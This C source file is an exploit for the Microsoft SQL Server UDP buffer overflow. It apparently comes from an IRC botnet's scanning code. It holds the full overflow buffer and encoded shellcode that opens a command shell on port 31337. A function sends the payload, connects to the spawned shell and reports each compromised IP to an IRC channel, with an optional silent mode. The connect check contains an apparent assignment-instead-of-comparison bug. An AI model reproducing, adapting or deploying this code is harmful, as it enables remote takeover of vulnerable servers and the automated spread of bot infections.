/*****************************************************************************/
/* THCsql 0.1 - MSSQL Server exploit for Server < SP3                        */
/* Exploit by: Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)            */
/* THC PUBLIC SOURCE MATERIALS                                               */
/*                                                                           */
/* The exploit can be freely distributed !                                   */
/*                                                                           */
/* This is just another exploit for the well known mssql server bug which    */
/* was found by David Litchfield last summer. Details in this advisory:      */
/*           http://www.nextgenss.com/advisories/mssql-udp.txt               */
/*                                                                           */
/* This exploit was tested on an english Windows 2k Server SP2 and MSSQL     */
/* Server with SP0 and SP2 and has worked properly. The used shellcode is    */
/* completely offsetless, which makes this exploit quite stable              */
/*                                                                           */
/* After successful exploitation of this bug, a commandshell should spawn on */
/* TCP port 31337 ! Use netcat to connect to this port !                     */
/*                                                                           */
/* If there's no connectable port 31337, maybe it's blocked by a firewall !  */
/*                                                                           */
/* compile with MS Visual C++ : cl THCsql.c /link ws2_32.lib                 */
/*                                                                           */
/* At least some greetz fly to : THC, Halvar Flake, FX, gera, MaXX, dvorak,  */
/* scut, stealth, zip, zilvio and the rest of the combo ......               */
/*****************************************************************************/
#include "includes.h"
#include "functions.h"

#ifndef NO_THCSQL

char badbuffer[] =
"\x04"
"THCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHC"
"THCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHC"
"\xdc\xc9\xb0\x42"
"\xeb\x0e"
"JC"
"THC!"
"\x01\x70\xae\x42"
"\x01\x70\xae\x42"
"\x8b\xfc\x83\xc7\x2c\x66\x81\xec\x04\x02\x33\xc9\xb2\x35\x66"
"\x81\xc1\x38\x01\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\xde\x16"
"\x4f\x5c\x37\x30\x59\x6c\xcd\x28\xa9\xeb\xb9\xe4\x79\x45\xe1"
"\x36\xc5\x12\x15\x15\x05\x3d\x62\x66\x07\x6a\x06\x07\x1b\x71"
"\x79\x79\x34\xde\x30\xdd\xcc\xca\xca\xca\x68\xb6\xd8\x1f\x5f"
"\x05\x6c\x51\xbe\x34\xbe\x75\x39\xbe\x45\x29\x98\xbe\x4d\x3d"
"\xb8\x6a\x09\xbe\x2e\x34\xce\xbe\x6e\x4d\x34\xce\xbe\x7e\x29"
"\x34\xcc\xbe\x66\x11\x34\xcf\x66\x64\x67\xbe\x6e\x15\x34\xce"
"\x04\xfc\x74\x04\xf5\xac\xbe\x01\xbe\x34\xcb\x99\x04\xf7\xe4"
"\xd7\xb1\xf5\x40\xc2\x3a\x83\x70\x30\xb8\x71\x70\x31\x53\x0c"
"\x25\x40\xd4\x53\x04\x25\x6f\x6d\x6b\x63\x65\x67\x1e\x7b\x25"
"\x74\x3a\x82\x39\x7f\xbe\x31\xbd\x34\xcd\x3a\x83\x78\x30\xbc"
"\x71\xb8\xed\xcb\x78\x30\x40\x8b\xcb\x78\x31\x41\x14\xcb\x78"
"\x17\xb8\x68\x2d\x66\xca\xe5\xbc\xf2\x5f\x31\x6d\xbd\x70\x30"
"\xb5\x70\x42\x3f\xb8\x68\x41\xb5\x5e\x13\x21\xdc\x4d\xca\xca"
"\xca\xbc\xfb\x04\xee\x66\x66\x66\x66\x63\x73\x63\xca\xe5\xa2"
"\x60\x6d\x53\xbc\x05\x5f\x25\x60\x62\xca\x60\xe1\x7b\x63\x62"
"\xca\x60\xf9\x66\x60\x62\xca\x60\xe5\xa2\xb8\x70\xbd\x65\xca"
"\x60\xd1\x60\x60\xca\x60\xdd\xb8\x71\x30\x39\xa1\x66\x5d\x1b"
"\x50\x4d\x50\x5d\x69\x56\x58\x51\xa1\x04\xe7\xb8\x70\xf9\xa1"
"\x62\x62\x62\x66\x66\xcb\xf3\x34\xc7\x67\xa1\xb8\x70\x4d\x65"
"\xb8\x70\xbd\x65\x84\x3d\x66\x66\x5f\x25\xcb\xfb\x67\x66\x66"
"\x66\x60\xca\x60\xd9\x5f\xca\xca\x60\xd5";

BOOL thcsql(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;
	unsigned int sock,rc;
	struct sockaddr_in sqludp;

	if ((sock=fsocket(AF_INET,SOCK_DGRAM,IPPROTO_UDP))==INVALID_SOCKET)
		return FALSE;

	sqludp.sin_family=AF_INET;
	sqludp.sin_addr.s_addr=finet_addr(exinfo.ip);
	sqludp.sin_port=fhtons(exinfo.port);

	if ((rc=fconnect(sock, (struct sockaddr *)&sqludp, sizeof(struct sockaddr_in)))=SOCKET_ERROR)
	{
		if(rc==0)
		{
			fsend(sock,badbuffer,sizeof(badbuffer)-1,0);
			Sleep(1000);
			if (ConnectShell(exinfo, 31337))
			{
				exploit[exinfo.exploit].stats++;
				if (!exinfo.silent)
					irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
			}
			else
				if (!exinfo.silent && exinfo.verbose)
					irc->privmsg(target,"%s %s: Failed to exploit IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		}
	}

	fshutdown(sock,1);
	fclosesocket(sock);
	return FALSE;
}

#endif